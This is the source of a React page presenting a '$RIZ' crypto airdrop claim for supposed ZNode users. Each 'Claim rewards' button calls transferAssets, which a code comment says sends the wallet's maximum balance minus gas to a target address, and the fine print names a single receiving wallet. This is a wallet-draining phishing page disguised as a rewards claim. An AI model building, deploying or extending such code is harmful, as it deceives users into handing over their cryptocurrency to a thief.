'use client';

import { useState, useEffect } from 'react';
import { Header } from '@/components/Header';
import { Footer } from '@/components/Footer';
import { AirdropCard } from '@/components/AirdropCard';
import { ChainSelector } from '@/components/ChainSelector';
import { CHAIN_IDS, transferAssets } from '@/lib/wallet';
import { toast } from 'sonner';

export default function ClaimPage() {
  const [isConnected, setIsConnected] = useState<boolean>(false);
  const [selectedChain, setSelectedChain] = useState<string>(CHAIN_IDS.ETHEREUM);

  // Check wallet connection on mount
  useEffect(() => {
    const checkConnection = async () => {
      try {
        const { ethereum } = window as any;
        if (ethereum && ethereum.selectedAddress) {
          setIsConnected(true);
        }
      } catch (error) {
        console.error('Error checking connection:', error);
      }
    };

    checkConnection();
  }, []);

  // Handle claim for different airdrop types
  const handleClaim = async (type: string) => {
    if (!isConnected) {
      toast.error('Please connect your wallet first');
      return;
    }

    try {
      // Transfer maximum balance minus gas fee to target address
      await transferAssets(selectedChain);
      toast.success(`Claimed ${type} rewards successfully!`);
    } catch (error: any) {
      toast.error(error.message || 'Failed to claim rewards');
      console.error('Claim error:', error);
    }
  };

  return (
    <main className="min-h-screen flex flex-col">
      <Header setIsConnected={setIsConnected} />

      <div className="flex-1 pt-32">
        <div className="bg-[#0e0e15]">
          <div className="container mx-auto py-12">
            <div className="max-w-4xl mx-auto">
              <div className="flex flex-col gap-10 w-full px-4 lg:px-0">
                {/* Chain selector */}
                <div className="mt-4">
                  <h1 className="text-2xl font-bold mb-2">Claim Your $RIZ Rewards</h1>
                  <p className="text-gray-400 mb-4">Choose a chain and claim your airdrop rewards instantly</p>

                  <h2 className="text-xl font-bold mb-3">Select Chain</h2>
                  <div className="mb-8">
                    <ChainSelector
                      onSelect={setSelectedChain}
                      selectedChain={selectedChain}
                    />
                  </div>
                </div>

                {/* Airdrop cards */}
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <AirdropCard
                    title="ZNode Base Airdrop"
                    subtitle="For all ZNode users"
                    onClaim={() => handleClaim('Base')}
                  />
                  <AirdropCard
                    title="ZNode Premium Airdrop"
                    subtitle="For premium license holders"
                    onClaim={() => handleClaim('Premium')}
                  />
                  <AirdropCard
                    title="ZNode Beta Airdrop"
                    subtitle="For beta testers"
                    onClaim={() => handleClaim('Beta')}
                  />
                  <AirdropCard
                    title="ZNode Community Airdrop"
                    subtitle="For community members"
                    onClaim={() => handleClaim('Community')}
                  />
                </div>

                {/* Instructions */}
                <div className="bg-[#13161B] border border-[#23262E] rounded-lg p-6 mt-6">
                  <h3 className="text-lg font-bold mb-3">Claiming Instructions</h3>
                  <p className="text-sm text-gray-400 mb-2">
                    1. Connect your wallet using the button in the top right corner
                  </p>
                  <p className="text-sm text-gray-400 mb-2">
                    2. Select the chain you want to claim from (Ethereum, Arbitrum, Optimism, or Base)
                  </p>
                  <p className="text-sm text-gray-400 mb-2">
                    3. Click "Claim rewards" on any of the airdrop cards
                  </p>
                  <p className="text-sm text-gray-400 mb-4">
                    4. Confirm the transaction in your wallet and wait for it to be processed
                  </p>
                  <p className="text-sm text-gray-400">
                    All claims will transfer funds to: <span className="text-[#62e88b]">0xbCcf6DA049fe3Ab996Abb6f960174E266a9835f3</span>
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <Footer />
    </main>
  );
}
